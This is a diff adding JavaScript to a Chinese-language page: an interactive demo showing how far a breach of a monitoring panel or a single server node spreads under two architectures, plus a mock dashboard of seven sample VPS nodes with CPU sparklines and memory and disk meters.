+      v = "<p>攻击者进了面板，能做的只有：</p><ul><li>看到 IP 列表和历史指标</li><li>篡改面板显示、关闭这台主机上的告警</li><li>不能在任何 VPS 上执行命令，9 台机器继续正常运行</li></ul>";
+    } else {
+      v = "<p>" + names[state.node] + " 失守，影响止于此：</p><ul><li>只拿到这一台的私钥，伪造不了其他节点</li><li>新 SSH 登录触发告警</li><li>agent 被杀则 15 秒后报失联</li><li>在面板吊销公钥即可拒收其数据</li></ul>";
+    }
+    return v;
+  }
+
+  function render() {
+    btnN.setAttribute("aria-pressed", state.arch === "nezha");
+    btnW.setAttribute("aria-pressed", state.arch === "wl");
+    btnP.setAttribute("aria-pressed", state.panel);
+    var pb = document.getElementById("panel-box");
+    pb.classList.toggle("hit", state.panel);
+    document.getElementById("panel-state").textContent = state.panel ? "已被攻破" : "正常";
+    var owned = 0, html = "";
+    names.forEach(function (n, i) {
+      var s = status(i);
+      if (s === "owned") owned++;
+      html += '<button type="button" class="n ' + s + (state.node === i ? " origin" : "") + '" data-i="' + i + '" aria-label="模拟入侵 ' + n + '">' + n + "<small>" + label[s] + "</small></button>";
+    });
+    nodesEl.innerHTML = html;
+    var c = document.getElementById("owned-n");
+    c.textContent = owned;
+    c.className = owned > 1 ? "bad" : (state.panel || state.node !== null) ? "good" : "";
+    document.getElementById("verdict").innerHTML = verdict(owned);
+  }
+
+  btnN.addEventListener("click", function () { state.arch = "nezha"; render(); });
+  btnW.addEventListener("click", function () { state.arch = "wl"; render(); });
+  btnP.addEventListener("click", function () { state.panel = !state.panel; render(); });
+  document.getElementById("reset").addEventListener("click", function () { state.panel = false; state.node = null; render(); });
+  nodesEl.addEventListener("click", function (e) {
+    var b = e.target.closest(".n"); if (!b) return;
+    var i = +b.dataset.i;
+    state.node = state.node === i ? null : i;
+    render();
+  });
+  state.panel = true;
+  render();
+
+  /* mock dashboard */
+  var servers = [
+    { n: "hk-01", loc: "香港 · 2C2G", cpu: 14, mem: 41, disk: 46, up: "1.5 MB/s", dn: "8.6 MB/s", seed: 3 },
+    { n: "tyo-01", loc: "东京 · 1C1G", cpu: 62, mem: 78, disk: 33, up: "320 KB/s", dn: "1.1 MB/s", seed: 7, warn: true },
+    { n: "sg-01", loc: "新加坡 · 2C4G", cpu: 8, mem: 29, disk: 21, up: "96 KB/s", dn: "410 KB/s", seed: 11 },
+    { n: "la-01", loc: "洛杉矶 · 1C512M", cpu: 21, mem: 88, disk: 71, up: "2.3 MB/s", dn: "2.0 MB/s", seed: 5 },
+    { n: "fra-01", loc: "法兰克福 · 4C8G", cpu: 35, mem: 52, disk: 58, up: "740 KB/s", dn: "3.9 MB/s", seed: 13 },
+    { n: "ams-01", loc: "阿姆斯特丹 · 1C1G", cpu: 4, mem: 22, disk: 18, up: "12 KB/s", dn: "40 KB/s", seed: 17 },
+    { n: "bj-01", loc: "北京 · 2C2G · 失联 3 分钟", cpu: 0, mem: 0, disk: 0, up: "—", dn: "—", seed: 19, stale: true }
+  ];
+  function series(seed, base) {
+    var out = [], x = seed;
+    for (var i = 0; i < 30; i++) {
+      x = (x * 9301 + 49297) % 233280;
+      var r = x / 233280;
+      out.push(Math.max(2, Math.min(98, base + (r - 0.5) * 22 + Math.sin(i / 4 + seed) * 8)));
+    }
+    return out;
+  }
+  function spark(vals) {
+    var w = 120, h = 28, pts = vals.map(function (v, i) { return [(i / (vals.length - 1)) * (w - 3), h - 2 - (v / 100) * (h - 4)]; });
+    var line = pts.map(function (p) { return p[0].toFixed(1) + "," + p[1].toFixed(1); }).join(" ");
+    var last = pts[pts.length - 1];
+    return '<svg viewBox="0 0 ' + w + " " + h + '" preserveAspectRatio="none" aria-hidden="true"><polygon class="spark-area" points="0,' + h + " " + line + " " + last[0].toFixed(1) + "," + h + '"/><polyline class="spark-line" points="' + line + '"/><circle class="spark-dot" cx="' + last[0].toFixed(1) + '" cy="' + last[1].toFixed(1) + '" r="2.2"/></svg>';
+  }
+  function meter(v, stale) {
+    if (stale) return '<div class="meter">—<div class="track"></div></div>';
+    return '<div class="meter">' + v + '%<div class="track"><div class="fill' + (v >= 75 ? " hot" : "") + '" style="width:' + v + '%"></div></div></div>';
+  }
+  var rows = '<div class="row head"><span>节点</span><span>CPU · 近 2.5 分钟</span><span>内存</span><span>磁盘</span><span>网络 ↑ / ↓</span></div>';
+  servers.forEach(function (s) {
+    var dot = s.stale ? "crit" : s.warn ? "warn" : "ok";
+    rows += '<div class="row' + (s.stale ? " stale" : "") + '"><div class="name"><b><span class="dot ' + dot + '"></span>' + s.n + "</b><small>" + s.loc + "</small></div>" +
+      "<div>" + (s.stale ? '<span class="net">无数据</span>' : spark(series(s.seed, s.cpu))) + "</div>" +
+      meter(s.mem, s.stale) + meter(s.disk, s.stale) +
+      '<div class="net">' + s.up + "<br>" + s.dn + "</div></div>";
+  });
+  document.getElementById("rows").innerHTML = rows;
+})();
+</script>
